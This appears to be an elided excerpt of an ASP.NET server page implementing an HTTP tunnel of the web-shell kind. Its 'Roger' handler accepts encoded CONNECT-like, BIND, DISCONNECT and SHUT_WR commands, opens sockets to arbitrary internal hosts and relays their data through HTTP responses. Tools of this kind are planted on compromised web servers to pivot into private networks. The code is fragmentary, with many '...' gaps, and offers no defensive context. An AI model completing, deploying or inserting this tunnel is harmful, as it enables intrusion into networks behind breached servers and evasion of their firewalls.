...
<script runat="server">
        ...
        listener.BeginAccept(delegate(IAsyncResult result) {
            ...
            try {
                ...
                if (closeClientSocket) {
                    try { clientSocket.Close(); } catch (Exception) {}
                }
                try { listener.Close(); } catch (Exception) {}
            }
        }, null);
    }
    public void HandleRogerRequest() {
    int DATA          = 1;
    int CMD           = 2;
    int MARK          = 3;
    int STATUS        = 4;
    ...
    if (Request.ContentLength > 0) {
        byte[] buff = ReadRequestBody(Request.InputStream, Request.ContentLength);
...
if (cmd != null) {
    ...
    if (cmd == "CAPS") {
        ...
        TunnelState state = GetState(Application, mark);
        if (state != null) {
        ...
        try {
            ...
            try {
                ConnectWait(sender, remoteEP, 2000);
                ...
                state.Socket = sender;
                SetState(Application, mark, state);
                rinfo[STATUS] = "OK";
            } catch (SocketException ex) {
                sender.Close();
                rinfo[STATUS] = "FAIL";
        ...
        try {
            TunnelState state = GetState(Application, mark);
            Socket s = state == null ? null : state.Socket;
            if (s != null && s.Connected) {
                IPEndPoint clientEndPoint = (IPEndPoint)s.RemoteEndPoint;
                rinfo[IP] = clientEndPoint.Address.ToString();
                rinfo[PORT] = clientEndPoint.Port.ToString();
            }
        } catch (Exception e) {
        }
    } else if (cmd == "DISCONNECT") {
        RemoveState(Application, mark);
        rinfo[STATUS] = "OK";
    } else if (cmd == "SHUT_WR") {
        try {
            TunnelState state = GetState(Application, mark);
            if (state == null || state.Socket == null) throw new InvalidOperationException("Session is closed");
            if (!state.HalfCloseMode) throw new InvalidOperationException("Half-close mode is disabled");
            if (state.Socket.ProtocolType == ProtocolType.Tcp) {
                lock (state.WriteSync) {
                    if (!state.LocalWriteClosed) state.Socket.Shutdown(SocketShutdown.Send);
        ...
        while (true) {
            ...
            WriteStreamFrame(Response, frameInfo, streamCompression, streamLimit, en, de);
        ...
        if (state == null || state.Socket == null) {
            rinfo[STATUS] = "FAIL";
            rinfo[ERROR] = state == null ? "Session is closed" : "BIND is waiting for a peer";
        } else {
        Socket s = state.Socket;
        lock (state.ReadSync) {
        if (s.ProtocolType == ProtocolType.Tcp) {
            try {
                ...
                try {
                    ...
                    while (readLen < maxRead) {
                        int remaining = maxRead - readLen;
                        int requested = Math.Min(readbuflen, remaining);
                        c = BeginReceiveReady(s, readBuff, 0, requested);
                        if (c <= 0) break;
                        System.Buffer.BlockCopy(readBuff, 0, readData, readLen, c);
                        readLen += c;
                        if (c < requested)
                    ...
                    if (IsWouldBlock(ex)) rinfo[STATUS] = "OK";
                    else throw;
                }
            } catch (Exception ex) {
                rinfo[STATUS] = "FAIL";
    ...
    TunnelState responseState = GetState(Application, mark);
    ...
    Response.Write(Base64EncodeMapped(blv_encode(rinfo, responseCompression, responseLimit)));
    } else {
        Response.Write(Encoding.Default.GetString(Base64DecodeMapped(rogerHello)));
    }
    }

    protected void Page_Load(object sender, EventArgs e) {
        RegisterAsyncTask(new PageAsyncTask(BeginRogerPageTask, EndRogerPageTask, null, null));
    }

    public IAsyncResult BeginRogerPageTask(Object sender, EventArgs e, AsyncCallback callback, Object extraData) {
    ...
    public void EndRogerPageTask(IAsyncResult result) {
